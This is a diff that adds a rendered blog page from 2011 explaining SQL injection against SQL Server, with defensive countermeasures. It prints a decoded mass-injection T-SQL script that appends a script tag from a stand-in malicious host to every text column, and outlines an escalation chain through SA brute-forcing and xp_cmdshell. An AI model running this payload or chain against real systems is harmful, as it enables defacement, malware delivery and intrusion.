@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="en">
+  <!-- Beautiful Jekyll | MIT license | Copyright Dean Attali 2020 -->
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <title>Protecting against SQL Injection attacks</title>
+  
+  
+  <meta name="author" content="Reuben Sultana">
+  
+  
+  
+
+  <link rel="alternate" type="application/rss+xml" title="SQL Server Diaries - A personal take on SQL Server solutions" href="http://0.0.0.0:4000/feed.xml">
+
+  
+
+  
+
+  
+
+
+  
+    
+      
+  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+
+    
+      
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800">
+
+
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="/assets/css/bootstrap-social.css">
+    
+      <link rel="stylesheet" href="/assets/css/main.css">
+    
+  
+
+  
+
+  
+
+  <!-- Facebook OpenGraph tags -->
+  
+
+  
+  <meta property="og:title" content="Protecting against SQL Injection attacks">
+  
+
+   
+  <meta property="og:description" content="In a nutshell, an SQL injection attack is one where malicious code is passed to an instance of SQL Server for parsing and execution through a vulnerable application.  Although most SQL injection attacks can come from the web (having a larger “target audience”) even machines connected to an organisation’s network...">
+  
+
+
+  <meta property="og:type" content="website">
+
+  
+  <meta property="og:url" content="http://0.0.0.0:4000/blog/index.php/2011/01/15/protecting-against-sql-injection-attacks/">
+  <link rel="canonical" href="http://0.0.0.0:4000/blog/index.php/2011/01/15/protecting-against-sql-injection-attacks/">
+  
+
+  
+
+
+  <!-- Twitter summary cards -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="@reubensultana">
+  <meta name="twitter:creator" content="@reubensultana">
+
+  
+  <meta name="twitter:title" content="Protecting against SQL Injection attacks">
+  
+
+  
+  <meta name="twitter:description" content="In a nutshell, an SQL injection attack is one where malicious code is passed to an instance of SQL Server for parsing and execution through a vulnerable application.  Although most SQL injection attacks can come from the web (having a larger “target audience”) even machines connected to an organisation’s network...">
+  
+
+  
+
+  
+
+  
+
+</head>
+
+
+  <body>
+
+    
+
+  
+    <nav class="navbar navbar-expand-md navbar-light fixed-top navbar-custom "><a class="navbar-brand" href="http://0.0.0.0:4000/">SQL Server Diaries</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+
+  <div class="collapse navbar-collapse" id="main-navbar">
+    <ul class="navbar-nav ml-auto">
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="/about">About Me</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="/tags">Tags</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://reubensultana.com">Author's home</a>
+          </li></ul>
+  </div>
+
+  
+
+</nav>
+
+
+    <!-- TODO this file has become a mess, refactor it -->
+
+
+
+
+
+
+
+<header class="header-section ">
+
+<div class="intro-header no-img">
+  <div class="container-md">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+        <div class="post-heading">
+          <h1>Protecting against SQL Injection attacks</h1>
+      
+      
+      
+          <span class="post-meta">Posted on January 15, 2011</span>
+          
+            <!--- "ReadTime on GitHub Jekyll" (c) 2020 Ruby Griffith Ramirez, MIT License -->
+
+
+
+
+
+
+  
+  <span class="reader-time post-meta"><span class="d-none d-md-inline middot">&middot;</span> 3 minute read</span>
+
+
+          
+      
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</header>
+
+
+
+
+
+<div class="container-md">
+  <div class="row">
+    <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+
+      
+
+      <article role="main" class="blog-post">
+        <p>In a nutshell, an SQL injection attack is one where malicious code is passed to an instance of SQL Server for parsing and execution through a vulnerable application.  Although most SQL injection attacks can come from the web (having a larger “target audience”) even machines connected to an organisation’s network can pose a potential threat to the entire infrastructure.  Moreover, the applications do not necessarily have to be web-based ones.</p>
+
+<p>An SQL Injection attack performed through a website can be as simple as replacing an application’s user input parameters (which an application developer would have failed to validate for values, length, data ranges, etc.) with malicious SQL code.  The resultant actions can vary from simple data manipulation to more complex escalation of privilege - see examples below.</p>
+
+<hr />
+
+<h4 id="example-1---unauthorised-access">Example 1 - Unauthorised access</h4>
+
+<p>A malicious user can modify the input parameters of a form as shown in the below image to gain access to a system.</p>
+
+<p><img src="/assets/article_files/2011-01-15-protecting-against-sql-injection-attacks/sql_injection_unathorised_access.jpg" alt="Example 1 - Unauthorised access" /></p>
+
+<hr />
+
+<h4 id="example-2---view-unauthorised-information">Example 2 - View unauthorised information</h4>
+
+<p>The below image shows how an authenticated system user can view unauthorised information using SQL injection techniques.</p>
+
+<p><img src="/assets/article_files/2011-01-15-protecting-against-sql-injection-attacks/sql_injection_unathorised_view.jpg" alt="Example 2 - View unauthorised information" /></p>
+
+<hr />
+
+<h4 id="example-3---altering-data">Example 3 - Altering data</h4>
+
+<p>Another SQL injection technique commonly used is the passing of HEX strings to the SQL Server DBMS through vulnerable applications.  Basically, a website URL which accepts an input parameter can be replaced by something similar to the below (abridged) sample:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.../orderitem.asp?IT=GM-204;DECLARE%20@S%20NVARCHAR(4000);SET%20@S=CAST(0x44004500...006F007200%20AS%20NVARCHAR(4000));EXEC(@S);--
+</code></pre></div></div>
+
+<p>Decoding that binary data which is cast to a varchar yields the following (formatted for readability purposes):</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">DECLARE</span> <span class="o">@</span><span class="n">T</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">),</span> <span class="o">@</span><span class="k">C</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span>
+<span class="k">DECLARE</span> <span class="n">Table_Cursor</span> <span class="k">FOR</span>
+    <span class="k">select</span> <span class="n">a</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="n">b</span><span class="p">.</span><span class="n">name</span>
+    <span class="k">from</span> <span class="n">sysobjects</span> <span class="n">a</span><span class="p">,</span> <span class="n">syscolumns</span> <span class="n">b</span>
+    <span class="k">where</span> <span class="n">a</span><span class="p">.</span><span class="n">id</span><span class="o">=</span><span class="n">b</span><span class="p">.</span><span class="n">id</span> <span class="k">and</span> <span class="n">a</span><span class="p">.</span><span class="n">xtype</span><span class="o">=</span><span class="s1">'u'</span>
+    <span class="k">and</span><span class="p">(</span><span class="n">b</span><span class="p">.</span><span class="n">xtype</span><span class="o">=</span><span class="mi">99</span> <span class="k">or</span> <span class="n">b</span><span class="p">.</span><span class="n">xtype</span><span class="o">=</span><span class="mi">35</span> <span class="k">or</span> <span class="n">b</span><span class="p">.</span><span class="n">xtype</span><span class="o">=</span><span class="mi">231</span> <span class="k">or</span> <span class="n">b</span><span class="p">.</span><span class="n">xtype</span><span class="o">=</span><span class="mi">167</span><span class="p">)</span>
+<span class="k">OPEN</span> <span class="n">Table_Cursor</span>
+<span class="k">FETCH</span> <span class="k">NEXT</span> <span class="k">FROM</span> <span class="n">Table_Cursor</span> <span class="k">INTO</span> <span class="o">@</span><span class="n">T</span><span class="p">,</span> <span class="o">@</span><span class="k">C</span>
+<span class="n">WHILE</span><span class="p">(</span><span class="o">@@</span><span class="n">FETCH_STATUS</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+<span class="k">BEGIN</span>
+    <span class="k">EXEC</span><span class="p">(</span><span class="o">&lt;</span><span class="s1">'UPDATE ['</span> <span class="o">+</span> <span class="o">@</span><span class="n">T</span> <span class="o">+</span> <span class="s1">'] SET ['</span> <span class="o">+</span> <span class="o">@</span><span class="k">C</span> <span class="o">+</span> <span class="s1">'] = RTRIM(CONVERT(VARCHAR, ['</span> <span class="o">+</span> <span class="o">@</span><span class="k">C</span> <span class="o">+</span> <span class="s1">'])) + </span><span class="se">''</span><span class="s1">&amp;lt;script src="http://somebadsite.cn/badscript.js"&amp;gt;&amp;lt;/script&amp;gt;</span><span class="se">''</span><span class="s1">'</span><span class="p">)</span>
+    <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="k">FROM</span> <span class="n">Table_Cursor</span> <span class="k">INTO</span> <span class="o">@</span><span class="n">T</span><span class="p">,</span> <span class="o">@</span><span class="k">C</span>
+<span class="k">END</span>
+<span class="k">CLOSE</span> <span class="n">Table_Cursor</span>
+<span class="k">DEALLOCATE</span> <span class="n">Table_Cursor</span>
+</code></pre></div></div>
+
+<p>The script finds all text columns in the database and updates them with URL’s to other web sites.  This is only possible if the login which impersonates the website/application has permissions to modify the data in the database.</p>
+
+<p>Her are some references with updated listings of malicious URLs:</p>
+
+<ul>
+  <li><a href="http://www.bloombit.com/Articles/2008/05/ASCII-Encoded-Binary-String-Automated-SQL-Injection.aspx#attack-description">ASCII Encoded Binary String Automated SQL Injection</a></li>
+  <li><a href="http://www.theregister.co.uk/2008/08/07/new_sql_attacks/">SQL attacks inject government sites in US, UK</a></li>
+  <li><a href="http://isc.sans.org/diary.html?storyid=4840">Cleanup in isle 3 please. Asprox lying around</a></li>
+  <li><a href="http://www.certmag.com/read.php?in=3812">Cyberattacks Now Target Governments</a></li>
+</ul>
+
+<hr />
+
+<h4 id="example-4---escalating-privileges">Example 4 - Escalating privileges</h4>
+
+<p>So far the examples have focused on successful SQL injection attacks localised to the website’s database.  A maliciously crafted SQL statement can, if the database, DBMS and service are not configured securely, gain access to the host machine and potentially access other machines on the infrastructure.  The following steps demonstrate one way this is achievable:</p>
+
+<ol>
+  <li>Scan the network to gain an understanding of the possible vulnerable SQL Server machine.</li>
+  <li>Perform a brute force attack against any SQL Servers identified to test for weak passwords on the ‘SA’ login.</li>
+  <li>Connect to one of the machines using the “cracked” credentials and, using the SQL Server extended stored procedure “xp_cmdshell”, create a Windows account with Administrative privileges on the server.  This is possible if the SQL Server service account is running under one of the privileged built-in accounts or is a member of the Local Administrators.</li>
+  <li>Once administrative access is gained, using other tools, any Cached Credentials can be extracted from the machine.</li>
+  <li>The hacked-into machine can then be used to elevate the privileges to a Domain Administrator.</li>
+</ol>
+
+<hr />
+
+<h4 id="possible-solutions-and-countermeasures">Possible solutions and countermeasures</h4>
+
+<p>Countermeasures include (but are not limited to):</p>
+
+<ol>
+  <li>Write secure application code.</li>
+  <li>Test all website/application inputs for SQL injection vulnerabilities.</li>
+  <li>Implement the principle of least privilege at all layers of the solution (i.e. client, application, business, database, etc.).</li>
+  <li>Deploy websites/applications using separate accounts for reading and writing/updating data.</li>
+  <li>Use stored procedures to access data.</li>
+  <li>Do not build unchecked dynamic SQL strings.</li>
+  <li>Log user activity.</li>
+  <li>Periodically retest all website/application inputs for SQL injection vulnerabilities.</li>
+  <li>More…</li>
+</ol>
+
+<p>SQL injection attacks can only be prevented by following best practices and employing secure programming techniques.  Ongoing monitoring, detection, and pro-active defensive methods should also be utilised within the various layers of any web application.</p>
+
+<p>Finally, another two fine examples of SQL injection attacks:</p>
+
+<p><img src="/assets/article_files/2011-01-15-protecting-against-sql-injection-attacks/sql_injection_speed_camera.jpg" alt="Beat the Speed Cameras" /></p>
+
+<p><img src="/assets/article_files/2011-01-15-protecting-against-sql-injection-attacks/sql_injection_bobby_tables.jpg" alt="Bobby Tables" /></p>
+
+      </article>
+
+      
+        <div class="blog-tags">
+          Tags:
+          
+          
+            <a href="/tags#T-SQL Programming">T-SQL Programming</a>
+          
+            <a href="/tags#Security">Security</a>
+          
+            <a href="/tags#SQL Injection">SQL Injection</a>
+          
+            <a href="/tags#Security">Security</a>
+          
+            <a href="/tags#Database Administration">Database Administration</a>
+          
+            <a href="/tags#Database Design">Database Design</a>
+          
+            <a href="/tags#T-SQL Programming">T-SQL Programming</a>
+          
+            <a href="/tags#Code Samples">Code Samples</a>
+          
+            <a href="/tags#Coding Practices">Coding Practices</a>
+          
+            <a href="/tags#Development">Development</a>
+          
+            <a href="/tags#SQL Server">SQL Server</a>
+          
+          
+        </div>
+      
+
+      
+        <!-- Check if any share-links are active -->
+
+
+
+
+<section id = "social-share-section">
+  <span class="sr-only">Share: </span>
+
+  
+    <a href="https://twitter.com/intent/tweet?text=Protecting+against+SQL+Injection+attacks&url=http%3A%2F%2F0.0.0.0%3A4000%2Fblog%2Findex.php%2F2011%2F01%2F15%2Fprotecting-against-sql-injection-attacks%2F"
+      class="btn btn-social-icon btn-twitter" title="Share on Twitter">
+      <span class="fab fa-fw fa-twitter" aria-hidden="true"></span>
+      <span class="sr-only">Twitter</span>
+    </a>
+  
+
+  
+    <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2Fblog%2Findex.php%2F2011%2F01%2F15%2Fprotecting-against-sql-injection-attacks%2F"
+      class="btn btn-social-icon btn-facebook" title="Share on Facebook">
+      <span class="fab fa-fw fa-facebook" aria-hidden="true"></span>
+      <span class="sr-only">Facebook</span>
+    </a>
+  
+
+  
+    <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2F0.0.0.0%3A4000%2Fblog%2Findex.php%2F2011%2F01%2F15%2Fprotecting-against-sql-injection-attacks%2F"
+      class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
+      <span class="fab fa-fw fa-linkedin" aria-hidden="true"></span>
+      <span class="sr-only">LinkedIn</span>
+    </a>
+  
+
+  
+
+</section>
+
+
+
+      
+
+      <ul class="pagination blog-pager">
+        
+        <li class="page-item previous">
+          <a class="page-link" href="/blog/index.php/2011/01/08/date-and-time-data-types/" data-toggle="tooltip" data-placement="top" title="Date and Time data types">&larr; Previous Post</a>
+        </li>
+        
+        
+        <li class="page-item next">
+          <a class="page-link" href="/blog/index.php/2010/12/30/ssis-buffertempstoragepath-error/" data-toggle="tooltip" data-placement="top" title="SSIS error: 'buffer manager cannot create a temporary storage file on any path in the BufferTempStoragePath property'">Next Post &rarr;</a>
+        </li>
+        
+      </ul>
+      
+    </div>
+  </div>
+</div>
+
+
+    <footer>
+  <div class="container-md beautiful-jekyll-footer">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+      <ul class="list-inline text-center footer-links"><li class="list-inline-item">
+    <a href="/feed.xml" title="RSS">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">RSS</span>
+    </a>
+  </li><li class="list-inline-item">
+    <a href="mailto:info@sqlserverdiaries.com" title="Email me">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">Email me</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://github.com/reubensultana" title="GitHub">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">GitHub</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://twitter.com/reubensultana" title="Twitter">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">Twitter</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://linkedin.com/in/reubensultana" title="LinkedIn">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">LinkedIn</span>
+   </a>
+  </li></ul>
+
+      
+      <p class="copyright text-muted">
+      
+        Reuben Sultana
+        &nbsp;&bull;&nbsp;
+      
+      2020
+
+      
+        &nbsp;&bull;&nbsp;
+        <a href="http://0.0.0.0:4000/">sqlserverdiaries.com</a>
+      
+
+      
+      </p>
+      <!-- Please don't remove this, keep my open source work credited :) -->
+<!--
+      <p class="theme-by text-muted">
+        Theme by
+        <a href="https://beautifuljekyll.com">beautiful-jekyll</a>
+      </p>
+-->
+    </div>
+    </div>
+  </div>
+</footer>
+
+  
+    
+  
+    
+  <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+
+  
+
+
+
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script src="/assets/js/main.js"></script>
+    
+  
+
+
+
+
+
+
+  
+  </body>
+</html>
